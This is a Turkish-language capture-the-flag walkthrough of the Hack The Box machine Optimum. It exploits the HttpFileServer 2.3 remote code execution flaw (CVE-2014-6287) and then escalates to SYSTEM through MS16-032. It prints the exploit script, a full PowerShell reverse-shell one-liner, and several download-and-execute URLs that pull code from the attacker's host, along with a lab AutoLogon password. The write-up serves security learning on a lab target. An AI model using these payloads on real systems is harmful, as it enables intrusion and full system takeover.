---
{"dg-publish":true,"permalink":"/ctf/optimum-ctf/"}
---


Optimum, exploit edilecek iki CVE'ye sahip bir Windows hostu olan HTB'de altıncı kutudur. İlki HttpFileServer yazılımındaki bir remote code execution açığı. Bunu bir shell elde etmek için kullanacağım. Privesc için, yamalanmamış kernel güvenlik açıklarına bakacağım. Bugün bunları listelemek için Watson'ı (winPEAS'de de yerleşiktir) kullanacaktım, ancak yeni sürümü bu eski kutuda çalıştırmak gerçekten zor, bu yüzden bu güvenlik açıklarını belirlemek için Sherlock'u (Watson'ın bir öncülü) kullanacağım. Shell'imin 32 bitlik bir proseste çalıştığını fark etmediğim için biraz takıldım ve bu da kernel exploitlerimin başarısız olmasına neden oldu. Bununla ilgili bazı analizler de göstereceğim.


## Box Info

| Name                                                                   | [Optimum](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Foptimum)[![Optimum](https://0xdf.gitlab.io/icons/box-optimum.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Foptimum)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Foptimum) |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Release Date                                                           | 18 Mar 2017                                                                                                                                                                                                                                                                                                                                                                          |
| Retire Date                                                            | 28 Oct 2017                                                                                                                                                                                                                                                                                                                                                                          |
| OS                                                                     | Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)                                                                                                                                                                                                                                                                                                                         |
| Base Points                                                            | Easy [20]                                                                                                                                                                                                                                                                                                                                                                            |
| Rated Difficulty                                                       | ![Rated difficulty for Optimum](https://0xdf.gitlab.io/img/optimum-diff.png)                                                                                                                                                                                                                                                                                                         |
| Radar Graph                                                            | ![Radar chart for Optimum](https://0xdf.gitlab.io/img/optimum-radar.png)                                                                                                                                                                                                                                                                                                             |
| ![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png) | 17 days 11:48:44[![adxn37](https://www.hackthebox.com/badge/image/32)](https://app.hackthebox.com/users/32)                                                                                                                                                                                                                                                                          |
| ![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png) | 18 days 06:34:38[![admin](https://www.hackthebox.com/badge/image/52)](https://app.hackthebox.com/users/52)                                                                                                                                                                                                                                                                           |
| Creator                                                                | [![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)                                                                                                                                                                                                                                                                                              |

## Recon

### nmap

nmap yalnızca bir açık TCP portu buldu, HTTP (80):

![Pasted image 20250209174656.png](/img/user/resimler/Pasted%20image%2020250209174656.png)

![Pasted image 20250209174737.png](/img/user/resimler/Pasted%20image%2020250209174737.png)

nmap hostu Windows olarak tanımlıyor, ancak HTTP sunucusu IIS'e benzemiyor, bu nedenle işletim sistemi sürümünü öğrenmek zor.


### Website - TCP 80

#### Site

Web sitesi tam da nmap komut dosyalarının tanımladığı şeydir - HttpFileServer (HFS):

![Pasted image 20250209174813.png](/img/user/resimler/Pasted%20image%2020250209174813.png)

Bazı basit cred tahminlerini denedim ama olmadı.

#### Vulnerabilities

Sayfanın en altında çalışan HFS'nin tam sürümü veriliyor, 2.3. searchsploit'in bu sürüm için bir exploit var:

![Pasted image 20250209175000.png](/img/user/resimler/Pasted%20image%2020250209175000.png)

Bu güvenlik açığı CVE-2014-6287 olarak bilinmektedir.

## Shell as kostas

### Exploit Analysis

Exploit'e bakmak için searchsploit -x windows/webapps/49125.py kullanarak, inanılmaz derecede basittir:

```
#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()    
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)
        
except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)
```


Python'da, f-string içindeki `{}` (dikkat edin, URL f'' içine sarılmış) değişkenleri temsil eder, bu nedenle `{{` ve `}}` gerçek küme parantezleri yazmak için kullanılan kaçış karakterleridir. Bu durumda, bu yalnızca RCE (Remote Code Execution - Uzaktan Kod Çalıştırma) elde etmek için `/?search={.+exec|[url-encoded command].}` adresine yapılan tek bir HTTP isteğidir.

```
http://10.10.10.8/?search=%00{.+exec|C%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20ping%2010.10.14.10.}
```

Or URL decoded:

```
http://10.10.10.8/?search=%00{.+exec|c:\windows\system32\cmd.exe+/c+ping+-c+1+10.10.14.10.}
```


### POC

Bir kavram kanıtı olarak, kendime ping atmayı denemek için bu URL'yi hazırladım:

```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}
```

Eğer çalışıyorsa, hostumda tek bir ICMP paketi görmeliyim. Tcpdump'ı başlattım ve gönderdim ama hiçbir şey yok.

Genellikle, bu mevcut ortamda sistemin ping yolunu bulamamasıyla ilgili bir sorun olabilir. Bu yüzden komuttan önce cmd /c eklemeyi denedim:

```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}
```

İşe yaradı (ilginç bir şekilde dört kez):

```
sudo tcpdump -i tun0 icmp and src 10.10.10.8

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:16:51.416240 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 117, length 40
16:16:51.416294 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 118, length 40
16:16:51.416309 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 119, length 40
16:16:51.418739 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 120, length 40
```

PowerShell ile de çalıştırabilirim:

```
http://10.10.10.8/?search=%00{.+exec|powershell.exe+/c+ping+-n+1+10.10.16.9.}
```


### Shell
Bu sunucunun eski olması ve kolay derecelendirmesi nedeniyle muhtemelen Defender / AMSI hakkında endişelenmem gerekmiyor, bu yüzden [Nishang](https://github.com/samratashok/nishang)'dan bir PowerShell scripti alacağım. `Invoke-PowerShellTcpOneLine.ps1` scriptini kopyalayıp yorumları keseceğim ve IP ile portu güncelleyeceğim.

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.9',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


Bunun bir kopyasını rev.ps1 olarak kaydedeceğim (sadece talep etmek üzere olduğum URL'yi daha kolay hale getirmek için). Sonra bir Python web sunucusu başlatacağım ve ziyaret edeceğim:

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.9/rev.ps1').}
```

Bu da Optimum'un web sunucusuna ulaşıp rev.ps1 dosyasını indirmesini (ilginç bir şekilde dört kez) tetikliyor:

![Pasted image 20250209180026.png](/img/user/resimler/Pasted%20image%2020250209180026.png)

![Pasted image 20250209180033.png](/img/user/resimler/Pasted%20image%2020250209180033.png)

![Pasted image 20250209180132.png](/img/user/resimler/Pasted%20image%2020250209180132.png)


## Shell as SYSTEM

### Enumeration - winPEAS

Yükselme yollarını aramak için [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) ile başladım. Deponun bir kopyasını hostuma klonladım, sudo smbserver.py share ile Windows exe ile yolda bir SMB sunucusu başlattım . -smb2support ile başlattım ve Optimum'a kopyaladım:

```
PS C:\programdata> copy \\10.10.14.10\share\winPEAS.exe .
```

Şimdi .\winPEAS.exe ile çalıştıracağım. Çıktıyı taradığımda birkaç ilginç şey gördüm.

Kutu Windows Server 2012 R2 ve 64-bit:

```
    Hostname: optimum                               
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard                       
    ReleaseId:                                      
    BuildBranch:                                    
    CurrentMajorVersionNumber:                      
    CurrentVersion: 6.3                             
    Architecture: AMD64
```


Kostas için Creds vardı:

```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*  
```

Bir sürü servis potansiyel olarak ilginç olarak belirtildi, ancak bunların hiçbirinden gerçekten bir sonuç çıkmadı.

### Enumeration - Watson/Sherlock

WinPEAS çıktısında dikkatimi çeken bir şey, [Watson](https://github.com/rasta-mouse/Watson) sonuçlarının olmamasıydı. Watson, bu Windows sunucusunun savunmasız olabileceği CVE'leri hızlıca kontrol eden bir araçtır ve HTB'nin ilk zamanlarında bu yaygın bir yükseltme tekniğiydi (hatta bu sunucuda da amaçlanan yol budur). Watson'ın çalışmamasının en olası nedeni, winPEAS'taki Watson'ın gerektirdiği .NET sürümünün 4.5 olması, ancak bu sunucuda yalnızca 4.0 sürümünün bulunmasıdır:

```
PS C:\windows\microsoft.net\framework> ls


    Directory: C:\windows\microsoft.net\framework


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         22/8/2013   6:39 ??            v1.0.3705
d----         22/8/2013   6:39 ??            v1.1.4322
d----         22/8/2013   6:39 ??            v2.0.50727
d----         20/3/2021   8:06 ??            v4.0.30319
...[snip]...
```

Eğer Watson'ı çalıştırmak istiyorsam, onu indirip kutudaki .NET sürümlerinden birine uyacak şekilde derleyerek çalıştırmayı deneyebilirim, ancak hızlı bir şekilde çalıştırmayı başaramadım. Bunun yerine, bu sunucu çok eski olduğu için, Watson'ın öncülü olan Sherlock'a yöneldim. Hem [Sherlock](https://github.com/rasta-mouse/Sherlock) hem de Watson'ı yaklaşık 2,5 yıl önce [Bounty](https://0xdf.gitlab.io/2018/10/27/htb-bounty.html#enumeration) yazısında göstermiştim.

Sherlock bir PowerShell scriptidir. Bir kopyasını indireceğim ve bir sürü fonksiyon tanımladığını ancak hiçbirini çağırmadığını göreceğim. Sonuna `Find-AllVulns` fonksiyonunu çağırmak için bir satır ekleyeceğim. Ardından, bir kopyasını barındırmak için bir Python HTTP sunucusu kullanacağım ve bir shell elde ettiğim yöntemle çalıştıracağım:

```
PS C:\> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Sherlock.ps1')
                                                    
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015              
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092                       
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable
                                                    
Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053                     
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems
                                                    
Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081                   
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems
                                                    
Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

MS16-032, MS16-034 ve MS16-135 olmak üzere üç adet “Appears Vulnerable” ibaresi bulunmaktadır.



### The Importance of Architecture

Bu exploitleri çalıştırmak için uzun süre uğraştım ve çalışması gereken yerlerde çalışmadılar. Sonra, çalışan **PowerShell process'inin** mimarisini bilmenin önemini hatırladım.

Sadece `powershell` komutunu çağırarak **shell**'i başlatmak, **32-bit bir process** olarak çalışan bir ortam döndürür:

```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess 
False
```

Bunun nedeni HFS prosesinin muhtemelen 32 bit proses olarak çalışıyor olmasıdır. Bu tablo ([ss64.com](https://ss64.com/nt/syntax-64bit.html)'dan alınmıştır) mevcut oturum mimarisine göre farklı yolların nasıl çalıştığını göstermektedir:

![Pasted image 20250209181241.png](/img/user/resimler/Pasted%20image%2020250209181241.png)

Dolayısıyla, 32 bitlik bir oturumda C:\windows\system32 yolundan PowerShell'i çağırmak 32 bitlik sürümü verecektir. 32 bit bir oturumda 64 bit işletim sistemine karşı kernel exploit çalıştırmaya çalışmak başarısız olacaktır.

64 bit bir shell elde etmek için, sysNative dizinindeki PowerShell'in tam yolunu kullanacağım:

```
GET /?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.9/rev.ps1').} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: HFS_SID=0.916518518235534
Upgrade-Insecure-Requests: 1
```

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.9/rev.ps1').}
```

Ortaya çıkan shell 64 bittir:

![Pasted image 20250209181539.png](/img/user/resimler/Pasted%20image%2020250209181539.png)

### MS16-032
Yukarıdaki exploit-db bağlantısı bu tür bir senaryo için çalışmayacaktır, çünkü bu bir komut çalıştırma imkanı sunmak yerine kutuda yeni bir pencere açacaktır. Neyse ki, Empire projesindeki ekip bu scriptin bir [versiyonunu](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) komut seçeneği ekleyecek şekilde uyarladı.

Bunun bir kopyasını indireceğim ve reverse shell'imi indirmek ve çalıştırmak için bir komutla çağırmak üzere sonuna bir satır ekleyeceğim:

```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.9/rev.ps1')"
```

64 bit shell'den (ve hem rev.ps1'i sunan bir Python web sunucusu hem de shell'i almak için 443'ü dinleyen nc ile), exploit'i indirmek ve çalıştırmak için aynı PowerShell cradle'ı kullanacağım:

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.9/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

Invoke-MS16032.ps1 için hemen bir istek geliyor. Son mesaj çıktıktan sonra, rev.ps1 için başka bir istek ve ardından nc'de bir shell var:

![Pasted image 20250209182929.png](/img/user/resimler/Pasted%20image%2020250209182929.png)

Ve root.txt dosyasını alabilirim:

![Pasted image 20250209183043.png](/img/user/resimler/Pasted%20image%2020250209183043.png)
